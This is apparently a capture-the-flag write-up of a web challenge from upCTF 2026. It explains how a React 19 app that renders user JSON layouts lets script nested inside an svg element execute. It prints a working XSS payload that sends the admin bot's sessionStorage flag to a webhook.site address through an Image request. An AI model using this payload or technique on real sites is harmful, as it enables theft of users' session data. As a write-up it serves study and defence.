# Post Builder — upCTF 2026

**Category:** Web (XSS)
**Flag:** `upCTF{r34ct_js_1s_still_j4v4scr1pt-cWBvwH4P696b549c}`

## TL;DR

React 19 app renders user-controlled JSON layouts via `React.createElement(wrapper, null, ...children)`. While HTML `<script>` tags don't execute when created by React's DOM reconciler, wrapping `<script>` inside `<svg>` causes the browser to treat it as an SVG script element — which DOES execute. Exfiltrate `sessionStorage.adminFlag` set by the bot via `Image().src` to webhook.

---

## Analysis

### Application Stack

```
React 19 frontend (dev mode via react-scripts start)
Flask backend (API + auth + SQLite)
Nginx reverse proxy (no CSP headers)
Puppeteer bot (Chromium headless, visits reported posts)
```

### Key Component — Element.js

```javascript
function Element({ config }) {
  const { wrapper = 'div', children = [] } = config;
  return React.createElement(wrapper, null, ...renderChildren(children));
}
```

- `wrapper`: user-controlled tag name (string)
- `children`: user-controlled text or nested Element configs
- **Props hardcoded to `null`** — no attributes can be injected

### Bot Behavior (bot.js)

```javascript
sessionStorage.setItem('adminFlag', flag);
window.location.href = targetUrl.replace(webUrl, '');
// Waits 6 seconds for XSS payloads
```

### Constraints

- No CSP headers (no restrictions on inline scripts or external requests)
- Props are always `null` → no `onerror`, `onload`, `src`, `href` injection
- React 19 creates DOM elements via `document.createElement` + reconciler
- HTML `<script>` tags created by React do NOT execute (React prevents it)

---

## Vulnerability

**SVG namespace script execution bypass**

When `React.createElement('svg', null, React.createElement('script', null, 'JS_CODE'))` renders:

1. React creates an `<svg>` element in the SVG namespace
2. The child `<script>` is created in the SVG namespace context
3. SVG `<script>` elements ARE executed by the browser when inserted into the DOM
4. This bypasses React's prevention of HTML script execution

### Why HTML script fails but SVG script works

HTML `<script>` elements created via React's reconciler are inserted using a method that doesn't trigger execution (React 19 uses special handling for `<script>` tags to prevent unintended execution during client-side rendering).

SVG `<script>` elements are NOT subject to this special handling. The browser's SVG parser/executor treats them as executable when they appear in an SVG context, regardless of how they were inserted into the DOM.

---

## Exploit

### Payload

```json
[{
  "wrapper": "svg",
  "children": [{
    "wrapper": "script",
    "children": ["new Image().src='https://webhook.site/UUID?f='+sessionStorage.getItem('adminFlag')"]
  }]
}]
```

### Steps

1. Register account
2. Create post with SVG+script payload
3. Report post → bot logs in, sets flag in sessionStorage, visits post
4. SVG script executes → `Image().src` sends flag to webhook (no CORS issues)
5. Read flag from webhook.site

### Approaches that DON'T work

| Vector | Why it fails |
|--------|-------------|
| `<script>` (HTML) | React 19 prevents execution during client-side rendering |
| `<img onerror>` | Props hardcoded to `null` — can't set attributes |
| `<style @import>` | CSS loads but can't access sessionStorage |
| `dangerouslySetInnerHTML` | Requires being in props object, which is `null` |
| `<iframe srcdoc>` | Can't set `srcdoc` attribute (props = null) |
| Prototype pollution via `__proto__` | JSON.parse treats `__proto__` as regular property |

---

## Key Lessons

1. **SVG namespace changes script behavior**: `<script>` inside `<svg>` executes even when HTML `<script>` doesn't — different DOM namespace rules apply
2. **React 19 script handling**: React 19 added script support but with guardrails; SVG scripts bypass those guardrails
3. **Build locally to test**: Docker container + local callback server saved massive time vs. blind testing against expiring instances
4. **Image exfil > fetch**: `new Image().src` avoids CORS issues entirely since it's a simple GET request

## References

- [React 19 — Support for Document Metadata](https://react.dev/blog/2024/12/05/react-19)
- [SVG Script Element](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/script)
- [XSS via SVG in React](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
